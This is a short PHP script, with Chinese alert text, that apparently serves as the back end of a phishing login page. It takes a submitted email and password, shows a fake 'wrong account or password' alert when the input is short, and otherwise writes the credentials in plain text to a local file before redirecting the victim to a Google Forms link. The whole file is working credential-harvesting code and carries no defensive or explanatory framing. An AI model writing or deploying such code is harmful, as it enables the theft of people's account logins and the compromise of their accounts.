<?php 
	$Email=$_POST[Email];
	$Password=$_POST[password];
	
	if ($Email=="" or strlen($Password)< 6) {
		echo "<script language=\"JavaScript\">\r\n"; 
		echo " alert(\"帳號密碼錯誤\");\r\n"; 
		echo " history.back();\r\n"; 
		echo "</script>"; 
	}
	else {
		$file=fopen("test.txt", "a");
		fwrite($file,"Email  $Email  password  $Password  \r\n");
		fclose($file);
		header("Location: http://goo.gl/forms/zXhB52kwLS"); 
	}
?>